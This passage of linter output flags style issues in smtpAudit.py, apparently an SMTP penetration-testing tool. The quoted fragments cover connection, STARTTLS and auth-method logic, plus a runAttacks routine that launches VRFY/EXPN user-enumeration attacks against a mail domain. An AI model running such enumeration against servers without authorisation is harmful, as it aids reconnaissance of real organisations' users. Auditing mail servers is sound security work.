1217 |             domainsToReview = list(
     |             ^^^^^^^^^^^^^^^
1218 |                 filter(
1219 |                     lambda x: not re.match(ipRex, x), self.getAllPossibleDomainNames()
     |

N806 Variable `domainsToReview` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1224:9
     |
1223 |         # Get only domains, not subdomains.
1224 |         domainsToReview = set(
     |         ^^^^^^^^^^^^^^^
1225 |             map(lambda x: ".".join(x.split(".")[-2:]), domainsToReview)
1226 |         )
     |

C417 Unnecessary `map()` usage (rewrite using a set comprehension)
    --> security\penetration-testing-tools\networks\smtpAudit.py:1224:27
     |
1223 |           # Get only domains, not subdomains.
1224 |           domainsToReview = set(
     |  ___________________________^
1225 | |             map(lambda x: ".".join(x.split(".")[-2:]), domainsToReview)
1226 | |         )
     | |_________^
1227 |
1228 |           out = list(filter(None, domainsToReview))
     |
help: Replace `map()` with a set comprehension

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1239:13
     |
1237 |                 self.server = None
1238 |                 time.sleep(0.5)
1239 |             except:
     |             ^^^^^^
1240 |                 pass
     |

N803 Argument name `sayHello` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1242:36
     |
1240 |                 pass
1241 |
1242 |     def connect(self, quiet=False, sayHello=False):
     |                                    ^^^^^^^^^^^^^^
1243 |         ret = False
1244 |         noBannerPreviously = self.banner == ""
     |

N806 Variable `noBannerPreviously` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1244:9
     |
1242 |     def connect(self, quiet=False, sayHello=False):
1243 |         ret = False
1244 |         noBannerPreviously = self.banner == ""
     |         ^^^^^^^^^^^^^^^^^^
1245 |
1246 |         if self.stopEverything:
     |

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1251:25
     |
1249 |         self.disconnect()
1250 |
1251 |         if self.port == None:
     |                         ^^^^
1252 |             ret = self.tryToConnectOnDifferentPorts(quiet)
1253 |         else:
     |
help: Replace with `cond is None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1257:18
     |
1256 |         if noBannerPreviously and self.banner:
1257 |             _out('SMTP banner: "{}"'.format(self.banner), True, colors.fg.pink)
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1258 |
1259 |         if ret and sayHello:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1262:17
     |
1260 |             dbg("Saying HELO/EHLO to the server...")
1261 |             out = self.sendcmd("EHLO " + SmtpTester.pretendLocalHostname)
1262 |             dbg("Server responded to HELO/EHLO with: {}".format(out))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1263 |
1264 |             if out[0]:
     |
help: Convert to f-string

N803 Argument name `sayHello` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1275:40
     |
1273 |         return ret
1274 |
1275 |     def connectSocket(self, port, ssl, sayHello=True):
     |                                        ^^^^^^^^^^^^^
1276 |         if ssl:
1277 |             self.server = smtplib.SMTP_SSL(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1323:21
     |
1321 |                 dbg("Saying HELO/EHLO to the server...")
1322 |                 out = self.sendcmd("EHLO " + SmtpTester.pretendLocalHostname)
1323 |                 dbg("Server responded to HELO/EHLO with: {}".format(out))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1324 |
1325 |                 self.parseHelpOutputAndUpdateServicesList(self.banner)
     |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1327:16
     |
1325 |                 self.parseHelpOutputAndUpdateServicesList(self.banner)
1326 |         else:
1327 |             if out[0] not in self.connectionErrorCodes.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1328 |                 self.connectionErrorCodes[out[0]] = 0
1329 |             else:
     |
help: Remove `.keys()`

SIM211 Use `not ...` instead of `False if ... else True`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1350:23
     |
1348 |             elif out[0] == 554:
1349 |                 # 554 - 5.7.1 no reverse DNS
1350 |                 out = False if self.connectionErrors > 0 else True
     |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1351 |                 err(
1352 |                     "Our host's IP does not have reverse DNS records - what makes SMTP server reject us.",
     |
help: Replace with `not ...`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1363:21
     |
1361 |               else:
1362 |                   err(
1363 | /                     "Unexpected response after connection, from {}:{}:\n\tCode: {}, Message: {}.".format(
1364 | |                         self.hostname, port, out[0], out[1]
1365 | |                     )
     | |_____________________^
1366 |                   )
1367 |               dbg("-> Got response: {}".format(out))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1367:17
     |
1365 |                     )
1366 |                 )
1367 |             dbg("-> Got response: {}".format(out))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1368 |
1369 |             self.connectionErrors += 1
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1382:17
     |
1380 |                 raise Exception("forced ssl")
1381 |
1382 |             dbg("Trying non-SSL over port: {}".format(port))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1383 |             self.connectSocket(port, False)
1384 |             return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1388:17
     |
1386 |         except Exception as e:
1387 |             # Try connecting over SSL socket
1388 |             dbg('Exception occured: "{}"'.format(str(e)))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1389 |             try:
1390 |                 dbg("Trying SSL over port: {}".format(port))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1390:21
     |
1388 |             dbg('Exception occured: "{}"'.format(str(e)))
1389 |             try:
1390 |                 dbg("Trying SSL over port: {}".format(port))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1391 |                 self.connectSocket(port, True)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1397:21
     |
1396 |             except Exception as e:
1397 |                 dbg('Both non-SSL and SSL connections failed: "{}"'.format(str(e)))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1398 |
1399 |         return False
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1420:21
     |
1418 |               else:
1419 |                   ok(
1420 | /                     "Connected to the server over port: {}, SSL: {}".format(
1421 | |                         self.port, self.ssl
1422 | |                     ),
     | |_____________________^
1423 |                       toOutLine=True,
1424 |                   )
     |
help: Convert to f-string

N803 Argument name `sayHello` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1428:32
     |
1426 |         return succeeded
1427 |
1428 |     def reconnect(self, quiet, sayHello=True):
     |                                ^^^^^^^^^^^^^
1429 |         #
1430 |         # The script has previously connected or knows what port to choose.
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1442:25
     |
1441 |                       info(
1442 | /                         "Awaiting {} secs for server to close some of our connections...".format(
1443 | |                             delay
1444 | |                         )
     | |_________________________^
1445 |                       )
1446 |                       time.sleep(delay)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1449:25
     |
1447 |                     continue
1448 |                 else:
1449 |                     dbg("Reconnection succeeded ({})".format(out))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1450 |                     return True
     |
help: Convert to f-string

UP041 [*] Replace aliased errors with `TimeoutError`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1452:20
     |
1450 |                       return True
1451 |
1452 |               except (
     |  ____________________^
1453 | |                 socket.gaierror,
1454 | |                 socket.timeout,
1455 | |                 smtplib.SMTPServerDisconnected,
1456 | |                 ConnectionResetError,
1457 | |             ) as e:
     | |_____________^
1458 |                   dbg('Reconnection failed ({}/3): "{}"'.format(i, str(e)))
     |
help: Replace with builtin `TimeoutError`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1458:21
     |
1456 |                 ConnectionResetError,
1457 |             ) as e:
1458 |                 dbg('Reconnection failed ({}/3): "{}"'.format(i, str(e)))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1459 |
1460 |             dbg("Server could not reconnect after it unexpectedly closed socket.")
     |
help: Convert to f-string

N805 First argument of a method should be named `self`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1479:23
     |
1477 |                 dbg("FAILED: Could not reconnect to set socket timeout.")
1478 |
1479 |     def processOutput(sendcmd):
     |                       ^^^^^^^
1480 |         def wrapper(self, command, nowrap=False):
1481 |             out = sendcmd(self, command, nowrap)
     |
help: Rename `sendcmd` to `self`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1492:21
     |
1491 |                   dbg(
1492 | /                     "STARTTLS reconnection after wrapping command ({})...".format(
1493 | |                         command
1494 | |                     )
     | |_____________________^
1495 |                   )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1502:21
     |
1501 |                   dbg(
1502 | /                     'Wrapping succeeded. Retrying command "{}" after STARTTLS.'.format(
1503 | |                         command
1504 | |                     )
     | |_____________________^
1505 |                   )
     |
help: Convert to f-string

N803 Argument name `sendEhlo` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1524:31
     |
1522 |         return wrapper
1523 |
1524 |     def performStarttls(self, sendEhlo=True):
     |                               ^^^^^^^^^^^^^
1525 |         ret = True
     |

E712 Avoid equality comparisons to `True`; use `self.ssl:` for truth checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:1527:12
     |
1525 |         ret = True
1526 |
1527 |         if self.ssl == True:
     |            ^^^^^^^^^^^^^^^^
1528 |             dbg("The connection is already carried through SSL Socket.")
1529 |             return True
     |
help: Replace with `self.ssl`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1577:25
     |
1575 |                   if not self.dumpTlsOnce:
1576 |                       dbg(
1577 | /                         "SSL Socket parameters:\n{}".format(
1578 | |                             pprint.pformat(self.server_tls_params)
1579 | |                         )
     | |_________________________^
1580 |                       )
1581 |                       self.dumpTlsOnce = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1587:29
     |
1585 |                     out = self.sendcmd("EHLO " + SmtpTester.pretendLocalHostname)
1586 |                     if out[0]:
1587 |                         dbg("EHLO after STARTTLS returned: {}".format(out))
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1588 |                     else:
1589 |                         err("EHLO after STARTTLS failed: {}".format(out))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1589:29
     |
1587 |                         dbg("EHLO after STARTTLS returned: {}".format(out))
1588 |                     else:
1589 |                         err("EHLO after STARTTLS failed: {}".format(out))
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1590 |
1591 |             except (socket.timeout, ConnectionResetError) as e:
     |
help: Convert to f-string

UP041 [*] Replace aliased errors with `TimeoutError`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1591:20
     |
1589 |                         err("EHLO after STARTTLS failed: {}".format(out))
1590 |
1591 |             except (socket.timeout, ConnectionResetError) as e:
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1592 |                 err(
1593 |                     "SSL Handshake timed-out (Firewall filtering?). Fall back to plain channel."
     |
help: Replace with builtin `TimeoutError`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1595:21
     |
1593 |                     "SSL Handshake timed-out (Firewall filtering?). Fall back to plain channel."
1594 |                 )
1595 |                 dbg('STARTTLS exception: "{}"'.format(str(e)))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1596 |
1597 |                 self.starttlsFailures += 1
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1606:17
     |
1604 |           else:
1605 |               fail(
1606 | /                 "The server has not reacted for STARTTLS: ({}). Try increasing timeout.".format(
1607 | |                     str(out)
1608 | |                 )
     | |_________________^
1609 |               )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1617:13
     |
1615 |         out = (False, False)
1616 |
1617 |         dbg('Sending command: "{}"'.format(command))
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1618 |         self.setSocketTimeout(3 * config["timeout"])
     |
help: Convert to f-string

B007 Loop control variable `j` not used within loop body
    --> security\penetration-testing-tools\networks\smtpAudit.py:1620:13
     |
1618 |         self.setSocketTimeout(3 * config["timeout"])
1619 |
1620 |         for j in range(3):
     |             ^
1621 |             try:
1622 |                 if config["delay"] > 0.0:
     |
help: Rename unused `j` to `_j`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1626:21
     |
1625 |                 out = self.server.docmd(command)
1626 |                 dbg("Command resulted with: {}.".format(out))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1627 |
1628 |                 if out[0] in (503,) and b"hello first" in out[1].lower():
     |
help: Convert to f-string

UP041 [*] Replace aliased errors with `TimeoutError`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1641:20
     |
1639 |                 break
1640 |
1641 |             except (smtplib.SMTPServerDisconnected, socket.timeout) as e:
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1642 |                 if str(e) == "Connection unexpectedly closed":
1643 |                     # smtplib.getreply() returns this error in case of reading empty line.
     |
help: Replace with builtin `TimeoutError`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1647:25
     |
1645 |                     # return (False, '')
1646 |
1647 |                     dbg("Connection unexpectedly closed: {}".format(str(e)))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1648 |
1649 |                     if self.connect(quiet=True, sayHello=False):
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1652:25
     |
1650 |                         continue
1651 |                 else:
1652 |                     dbg("Server has disconnected ({}).".format(str(e)))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1653 |                     if "connect" in str(e).lower():
1654 |                         dbg("Attempting to reconnect and resend command...")
     |
help: Convert to f-string

N806 Variable `helpMultilineCommandsRegexes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1676:13
     |
1674 |             )
1675 |
1676 |             helpMultilineCommandsRegexes = (
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1677 |                 r"(?:\\n)([a-zA-Z- 0-9]{3,})",
1678 |                 r"(?:\n)([a-zA-Z- 0-9]{3,})",
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1683:48
     |
1681 |             for rex in helpMultilineCommandsRegexes:
1682 |                 out = re.findall(rex, output)
1683 |                 if len([x for x in out if x != None]) > 0:
     |                                                ^^^^
1684 |                     return out
1685 |         else:
     |
help: Replace with `cond is not None`

C417 Unnecessary `map()` usage (rewrite using a set comprehension)
    --> security\penetration-testing-tools\networks\smtpAudit.py:1691:43
     |
1689 |         outlines = self.parseHelpOutput(out)
1690 |         if outlines:
1691 |             self.availableServices.update(set(map(lambda x: x.strip(), outlines)))
     |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1692 |             outlines = set()
     |
help: Replace `map()` with a set comprehension

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1695:17
     |
1694 |               dbg(
1695 | /                 "SMTP available services: {}".format(
1696 | |                     pprint.pformat(self.availableServices)
1697 | |                 )
     | |_________________^
1698 |               )
1699 |               return True
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\networks\smtpAudit.py:1709:9
     |
1707 |           outlines = set()
1708 |
1709 | /         if self.banner:
1710 | |             if self.parseHelpOutputAndUpdateServicesList(self.banner):
     | |______________________________________________________________________^
1711 |                   return True
     |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1715:17
     |
1713 |         out = self.sendcmd("EHLO " + SmtpTester.pretendLocalHostname)
1714 |         if out[0]:
1715 |             dbg("EHLO returned: {}".format(out))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1716 |             if self.parseHelpOutputAndUpdateServicesList(out[1].decode()):
1717 |                 return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1737:37
     |
1735 |   ΓÇª                     if m and (pos > 0 and ret[pos - 1] == "\n"):
1736 |   ΓÇª                         dbg(
1737 | / ΓÇª                             'Following line was found by 2nd method HELP parsing: "{}"'.format(
1738 | | ΓÇª                                 line
1739 | | ΓÇª                             )
     | |_______________________________^
1740 |   ΓÇª                         )
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:1747:33
     |
1745 |                     break
1746 |
1747 |             except Exception as e:
     |                                 ^
1748 |                 continue
     |
help: Remove assignment to unused variable `e`

C417 Unnecessary `map()` usage (rewrite using a set comprehension)
    --> security\penetration-testing-tools\networks\smtpAudit.py:1751:43
     |
1750 |         if outlines:
1751 |             self.availableServices.update(set(map(lambda x: x.strip(), outlines)))
     |                                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1752 |
1753 |             dbg(
     |
help: Replace `map()` with a set comprehension

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1754:17
     |
1753 |               dbg(
1754 | /                 "SMTP available services: {}".format(
1755 | |                     pprint.pformat(self.availableServices)
1756 | |                 )
     | |_________________^
1757 |               )
1758 |               return True
     |
help: Convert to f-string

N806 Variable `authMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1771:9
     |
1769 |             return None
1770 |
1771 |         authMethods = set()
     |         ^^^^^^^^^^^
1772 |         authMethodsList = list(
1773 |             filter(
     |

N806 Variable `authMethodsList` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1772:9
     |
1771 |         authMethods = set()
1772 |         authMethodsList = list(
     |         ^^^^^^^^^^^^^^^
1773 |             filter(
1774 |                 lambda x: x.lower().startswith(service.lower())
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1783:17
     |
1781 |         if authMethodsList:
1782 |             dbg(
1783 |                 "List of candidates for {} methods: {}".format(service, authMethodsList)
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1784 |             )
     |
help: Convert to f-string

C403 Unnecessary list comprehension (rewrite as a set comprehension)
    --> security\penetration-testing-tools\networks\smtpAudit.py:1791:25
     |
1790 |                   if auth.count(" ") > 0:
1791 |                       s = set(
     |  _________________________^
1792 | |                         [
1793 | |                             "{}".format(a)
1794 | |                             for a in auth.split(" ")
1795 | |                             if a.lower() != service.lower()
1796 | |                         ]
1797 | |                     )
     | |_____________________^
1798 |                       authMethods.update(s)
1799 |                   else:
     |
help: Rewrite as a set comprehension

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1793:29
     |
1791 |                     s = set(
1792 |                         [
1793 |                             "{}".format(a)
     |                             ^^^^^^^^^^^^^^
1794 |                             for a in auth.split(" ")
1795 |                             if a.lower() != service.lower()
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1802:17
     |
1800 |                     authMethods.add(auth)
1801 |         else:
1802 |             dbg("The server does not offer any {} methods.".format(service))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1803 |
1804 |         if authMethods:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1805:17
     |
1804 |         if authMethods:
1805 |             dbg("List of {} methods to test: {}".format(service, authMethods))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1806 |
1807 |         return authMethods
     |
help: Convert to f-string

N803 Argument name `keywordsAtLeast` should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1810:55
     |
1809 |     @staticmethod
1810 |     def ifMessageLike(out, codes=None, keywords=None, keywordsAtLeast=0):
     |                                                       ^^^^^^^^^^^^^^^^^
1811 |         codeCheck = False
1812 |         keywordCheck = False
     |

N806 Variable `codeCheck` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1811:9
     |
1809 |     @staticmethod
1810 |     def ifMessageLike(out, codes=None, keywords=None, keywordsAtLeast=0):
1811 |         codeCheck = False
     |         ^^^^^^^^^
1812 |         keywordCheck = False
     |

N806 Variable `keywordCheck` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1812:9
     |
1810 |     def ifMessageLike(out, codes=None, keywords=None, keywordsAtLeast=0):
1811 |         codeCheck = False
1812 |         keywordCheck = False
     |         ^^^^^^^^^^^^
1813 |
1814 |         if not codes and not keywords:
     |

SIM108 Use ternary operator `codeCheck = out[0] in codes if codes != None and len(codes) > 0 else True` instead of `if`-`else`-block
    --> security\penetration-testing-tools\networks\smtpAudit.py:1824:9
     |
1822 |                   found += 1
1823 |
1824 | /         if codes != None and len(codes) > 0:
1825 | |             codeCheck = out[0] in codes
1826 | |         else:
1827 | |             codeCheck = True
     | |____________________________^
1828 |
1829 |           if keywords != None and len(keywords) > 0:
     |
help: Replace `if`-`else`-block with `codeCheck = out[0] in codes if codes != None and len(codes) > 0 else True`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1824:21
     |
1822 |                 found += 1
1823 |
1824 |         if codes != None and len(codes) > 0:
     |                     ^^^^
1825 |             codeCheck = out[0] in codes
1826 |         else:
     |
help: Replace with `cond is not None`

N806 Variable `codeCheck` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1825:13
     |
1824 |         if codes != None and len(codes) > 0:
1825 |             codeCheck = out[0] in codes
     |             ^^^^^^^^^
1826 |         else:
1827 |             codeCheck = True
     |

N806 Variable `codeCheck` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1827:13
     |
1825 |             codeCheck = out[0] in codes
1826 |         else:
1827 |             codeCheck = True
     |             ^^^^^^^^^
1828 |
1829 |         if keywords != None and len(keywords) > 0:
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1829:24
     |
1827 |             codeCheck = True
1828 |
1829 |         if keywords != None and len(keywords) > 0:
     |                        ^^^^
1830 |             if keywordsAtLeast == 0:
1831 |                 keywordCheck = found == len(keywords)
     |
help: Replace with `cond is not None`

N806 Variable `keywordCheck` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1831:17
     |
1829 |         if keywords != None and len(keywords) > 0:
1830 |             if keywordsAtLeast == 0:
1831 |                 keywordCheck = found == len(keywords)
     |                 ^^^^^^^^^^^^
1832 |             else:
1833 |                 keywordCheck = found >= keywordsAtLeast
     |

N806 Variable `keywordCheck` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1833:17
     |
1831 |                 keywordCheck = found == len(keywords)
1832 |             else:
1833 |                 keywordCheck = found >= keywordsAtLeast
     |                 ^^^^^^^^^^^^
1834 |         else:
1835 |             keywordCheck = True
     |

N806 Variable `keywordCheck` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1835:13
     |
1833 |                 keywordCheck = found >= keywordsAtLeast
1834 |         else:
1835 |             keywordCheck = True
     |             ^^^^^^^^^^^^
1836 |
1837 |         return codeCheck and keywordCheck
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1849:21
     |
1847 |               if config["smtp_debug"]:
1848 |                   dbg(
1849 | /                     'Test: "{}" being skipped as it was marked as disabled.'.format(
1850 | |                         test
1851 | |                     )
     | |_____________________^
1852 |                   )
1853 |               return False
     |
help: Convert to f-string

N806 Variable `dkimTestThread` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1856:9
     |
1855 |     def runTests(self):
1856 |         dkimTestThread = None
     |         ^^^^^^^^^^^^^^
1857 |         if SmtpTester.checkIfTestToRun("dkim"):
1858 |             dkimTestThread = self.dkimTestThread()
     |

N806 Variable `dkimTestThread` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1858:13
     |
1856 |         dkimTestThread = None
1857 |         if SmtpTester.checkIfTestToRun("dkim"):
1858 |             dkimTestThread = self.dkimTestThread()
     |             ^^^^^^^^^^^^^^
1859 |
1860 |         results = [
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:1885:17
     |
1884 |             assert (
1885 |                 test in SmtpTester.testsConducted.keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1886 |             ), "The test: '{}' has not been added to SmtpTester.testsConducted!".format(
1887 |                 test
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1886:16
     |
1884 |               assert (
1885 |                   test in SmtpTester.testsConducted.keys()
1886 |               ), "The test: '{}' has not been added to SmtpTester.testsConducted!".format(
     |  ________________^
1887 | |                 test
1888 | |             )
     | |_____________^
1889 |
1890 |               if self.stopEverything:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1908:17
     |
1906 |                 once = False
1907 |
1908 |             dbg('Starting test: "{}"'.format(test))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1909 |             self.results[test] = func()
     |
help: Convert to f-string

N806 Variable `testDmarc` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1917:9
     |
1915 |                 self.reconnect(quiet=True)
1916 |
1917 |         testDmarc = False
     |         ^^^^^^^^^
1918 |         if (
1919 |             SmtpTester.checkIfTestToRun("dkim")
     |

N806 Variable `testDmarc` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1923:13
     |
1921 |             and SmtpTester.checkIfTestToRun("dmarc")
1922 |         ):
1923 |             testDmarc = True
     |             ^^^^^^^^^
1924 |             self.results["dmarc"] = None
     |

N806 Variable `attacksToBeLaunched` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:1968:9
     |
1967 |     def runAttacks(self):
1968 |         attacksToBeLaunched = {
     |         ^^^^^^^^^^^^^^^^^^^
1969 |             "vrfy": self.vrfyTest,
1970 |             "expn": self.expnTest,
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1977:13
     |
1976 |         info(
1977 |             "Attacks will be launched against domain: @{}".format(self.getMailDomain()),
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1978 |             toOutLine=True,
1979 |         )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1986:18
     |
1984 |                 continue
1985 |
1986 |             info("Launching attack: {} enumeration.".format(attack), toOutLine=True)
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1987 |             out = func(attackMode=True)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1990:22
     |
1989 |             if out and isinstance(out, list):
1990 |                 info("Attack result: {} users found.".format(len(out)), toOutLine=True)
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1991 |                 results.extend(out)
1992 |             elif out:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:1994:21
     |
1992 |             elif out:
1993 |                 info(
